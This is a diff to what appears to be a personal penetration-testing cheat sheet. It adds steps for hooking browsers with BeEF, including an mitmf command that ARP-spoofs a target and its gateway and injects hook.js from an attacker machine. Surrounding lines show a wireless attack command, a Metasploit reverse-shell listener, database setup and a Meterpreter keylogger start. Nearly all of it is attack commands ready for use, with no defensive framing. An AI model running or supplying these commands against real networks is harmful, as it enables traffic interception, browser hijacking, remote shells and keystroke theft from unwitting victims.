@@ -83,6 +83,16 @@ sudo aireplay-ng wlan0
 
 
 #############################
+# Beef
+#############################
+http://beefproject.com/
+https://www.youtube.com/watch?v=0J-SDT8CS0E
+1) create payload
+2) cd /beef && ./beef
+3) mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --js-url http://192.169.3.xxx:3000/hook.js (kali ip address)
+
+
+#############################
 # Behind NAT Attack
 #############################
 https://null-byte.wonderhowto.com/how-to/perform-attack-over-wan-internet-0168583/
@@ -100,6 +110,11 @@ use multi/handler
     set LHOST 10.0.0.2
     set LPORT 4444
 exploit
+
+
+// start postgressql
+service postgresql start
+msfdb init
 
 // Meterpreter Key logger
 keyscan_start
